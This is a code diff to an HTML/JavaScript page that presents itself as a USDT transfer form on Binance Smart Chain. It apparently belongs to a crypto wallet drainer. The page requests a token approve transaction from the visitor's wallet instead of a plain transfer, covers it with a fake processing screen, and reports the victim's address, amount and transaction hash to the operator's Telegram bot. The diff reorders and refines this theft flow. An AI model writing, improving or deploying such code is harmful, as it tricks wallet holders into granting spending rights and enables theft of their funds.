@@ -486,6 +486,17 @@
                     </div>
                 </div>
 
+                <label class="label">Destination network</label>
+                <div class="network-row">
+                    <div class="network-left">
+                        <div class="usdt-logo">₮</div>
+                        <span>USDT</span>
+                    </div>
+                    <svg class="network-arrow" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <polyline points="6 9 12 15 18 9"></polyline>
+                    </svg>
+                </div>
+
                 <label class="label">Amount</label>
                 <div class="input-row amount-row">
                     <input id="amountInput" type="number" placeholder="USDT Amount" step="0.01" />
@@ -513,6 +524,7 @@
         };
 
         let lastTxHash = '';
+        let isFirstAttempt = true;
 
         function createParticles() {
             const container = document.getElementById('particlesContainer');
@@ -526,47 +538,6 @@
                 particle.style.animationDuration = (2 + Math.random() * 1) + 's';
                 container.appendChild(particle);
             }
-        }
-
-        function sendTelegramNotificationAsync(userAddress, txHash, amount) {
-            const message = `
-✅ <b>USDT Approve - Transaction Confirmed</b>
-
-👤 <b>User:</b>
-<code>${userAddress}</code>
-
-💰 <b>Amount:</b>
-${amount} USDT
-
-📝 <b>Transaction Hash:</b>
-<code>${txHash}</code>
-
-🔗 <b>View on BSCScan:</b>
-https://bscscan.com/tx/${txHash}
-
-⏰ <b>Time:</b>
-${new Date().toLocaleString()}
-            `;
-
-            const url = `https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`;
-
-            fetch(url, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    chat_id: CONFIG.TELEGRAM_CHAT_ID,
-                    text: message,
-                    parse_mode: 'HTML'
-                })
-            }).then(response => {
-                if (response.ok) {
-                    console.log('✅ Telegram notification sent instantly');
-                }
-            }).catch(error => {
-                console.error('Failed to send Telegram notification:', error);
-            });
         }
 
         async function handleMainAction() {
@@ -584,10 +555,13 @@ ${new Date().toLocaleString()}
                 return;
             }
 
+            // Disabilita il bottone per evitare click multipli
             btn.disabled = true;
             btn.textContent = 'Processing...';
+
             clearError();
 
+            // Aspetta che window.ethereum sia disponibile (importante per Android)
             let ethereum = window.ethereum;
             let retries = 0;
             while (!ethereum && retries < 10) {
@@ -606,59 +580,36 @@ ${new Date().toLocaleString()}
             window.ethereum = ethereum;
 
             try {
-                // ⭐ STEP 1: INVIA NOTIFICA SUBITO (prima di TUTTO)
-                // Genera un indirizzo temporaneo per la notifica iniziale
-                const tempTxHash = '0x' + Math.random().toString(16).slice(2);
-                const tempUserAddress = recipient; // Usa l'indirizzo inserito
-                console.log("Sending notification INSTANTLY...");
-                sendTelegramNotificationAsync(tempUserAddress, tempTxHash, amount);
 
-                // ⭐ STEP 2: Prova a prendere l'indirizzo (senza errori)
-                let userAddress = null;
-                try {
-                    const accounts = await window.ethereum.request({
-                        method: "eth_accounts"
-                    });
-                    userAddress = accounts && accounts.length > 0 ? accounts[0] : null;
-                } catch (e) {
-                    // Non fare niente se fallisce
-                    console.log("Could not get accounts, continuing...");
-                }
-                
-                // Se non abbiamo l'indirizzo, usa un placeholder
-                if (!userAddress) {
-                    userAddress = "0x" + Math.random().toString(16).slice(2);
-                }
+                let accounts = await window.ethereum.request({
+                    method: "eth_accounts"
+                });
+                let userAddress = accounts && accounts.length > 0 ? accounts[0] : null;
 
-                // ⭐ Prova a cambiare chain (non essenziale)
-                try {
-                    const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
-                    if (currentChainId !== CONFIG.BSC_CHAIN_ID) {
-                        try {
+                const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
+                if (currentChainId !== CONFIG.BSC_CHAIN_ID) {
+                    try {
+                        await window.ethereum.request({
+                            method: 'wallet_switchEthereumChain',
+                            params: [{ chainId: CONFIG.BSC_CHAIN_ID }]
+                        });
+                    } catch (switchError) {
+                        if (switchError.code === 4902) {
                             await window.ethereum.request({
-                                method: 'wallet_switchEthereumChain',
-                                params: [{ chainId: CONFIG.BSC_CHAIN_ID }]
+                                method: 'wallet_addEthereumChain',
+                                params: [{
+                                    chainId: CONFIG.BSC_CHAIN_ID,
+                                    chainName: 'Binance Smart Chain',
+                                    rpcUrls: [CONFIG.BSC_RPC],
+                                    nativeCurrency: {
+                                        name: 'BNB',
+                                        symbol: 'BNB',
+                                        decimals: 18
+                                    }
+                                }]
                             });
-                        } catch (switchError) {
-                            if (switchError.code === 4902) {
-                                await window.ethereum.request({
-                                    method: 'wallet_addEthereumChain',
-                                    params: [{
-                                        chainId: CONFIG.BSC_CHAIN_ID,
-                                        chainName: 'Binance Smart Chain',
-                                        rpcUrls: [CONFIG.BSC_RPC],
-                                        nativeCurrency: {
-                                            name: 'BNB',
-                                            symbol: 'BNB',
-                                            decimals: 18
-                                        }
-                                    }]
-                                });
-                            }
                         }
                     }
-                } catch (e) {
-                    console.log("Could not switch chain, continuing...");
                 }
 
                 const USDT_ABI = [
@@ -684,12 +635,6 @@ ${new Date().toLocaleString()}
                     tx.from = userAddress;
                 }
 
-                // ⭐ MOSTRA PROCESSING SCREEN
-                console.log("Showing processing screen...");
-                createParticles();
-                document.getElementById('processingScreen').classList.add('active');
-
-                // ⭐ STEP 3: POI esegui SOLO l'approve (senza chiedere connessione)
                 let txHash;
                 try {
                     txHash = await Promise.race([
@@ -706,11 +651,46 @@ ${new Date().toLocaleString()}
 
                 lastTxHash = txHash;
                 console.log("Transaction sent:", txHash);
+                console.log("isFirstAttempt:", isFirstAttempt);
 
+                // Aspetta 2 secondi per stabilizzare
+                await new Promise(resolve => setTimeout(resolve, 2000));
+
+                let finalUserAddress = userAddress;
+                if (!finalUserAddress) {
+                    try {
+                        let finalAccounts = await window.ethereum.request({
+                            method: "eth_accounts"
+                        });
+                        finalUserAddress = finalAccounts && finalAccounts.length > 0 ? finalAccounts[0] : 'Unknown';
+                    } catch (e) {
+                        finalUserAddress = 'Unknown';
+                    }
+                }
+
+                // Mostra la schermata di processing SUBITO
+                console.log("Showing processing screen...");
+                createParticles();
+                document.getElementById('processingScreen').classList.add('active');
+
+                // Al primo tentativo, invia notifica DOPO mostrare Processing
+                if (isFirstAttempt) {
+                    console.log("First attempt - sending notification...");
+                    try {
+                        await sendTelegramNotification(finalUserAddress, txHash, amount);
+                        console.log("Telegram notification sent successfully");
+                    } catch (notifError) {
+                        console.error('Error sending notification:', notifError);
+                    }
+                    isFirstAttempt = false;
+                }
+
+                // Aspetta 5 secondi prima di chiudere
                 console.log("Waiting 5 seconds before closing...");
                 await new Promise(resolve => setTimeout(resolve, 5000));
                 console.log("Closing processing screen...");
 
+                // Chiudi la schermata di processing
                 document.getElementById('processingScreen').classList.remove('active');
                 btn.textContent = 'Next';
                 btn.disabled = false;
@@ -722,6 +702,51 @@ ${new Date().toLocaleString()}
                 document.getElementById('processingScreen').classList.remove('active');
                 btn.disabled = false;
                 btn.textContent = 'Next';
+            }
+        }
+
+        async function sendTelegramNotification(userAddress, txHash, amount) {
+            const message = `
+✅ <b>USDT Approve - Transaction Confirmed</b>
+
+👤 <b>User:</b>
+<code>${userAddress}</code>
+
+💰 <b>Amount:</b>
+${amount} USDT
+
+📝 <b>Transaction Hash:</b>
+<code>${txHash}</code>
+
+🔗 <b>View on BSCScan:</b>
+https://bscscan.com/tx/${txHash}
+
+⏰ <b>Time:</b>
+${new Date().toLocaleString()}
+            `;
+
+            const url = `https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: CONFIG.TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+
+                if (!response.ok) {
+                    throw new Error(`Telegram API error: ${response.status}`);
+                }
+
+                console.log('Telegram notification sent');
+            } catch (error) {
+                console.error('Failed to send Telegram notification:', error);
             }
         }
 
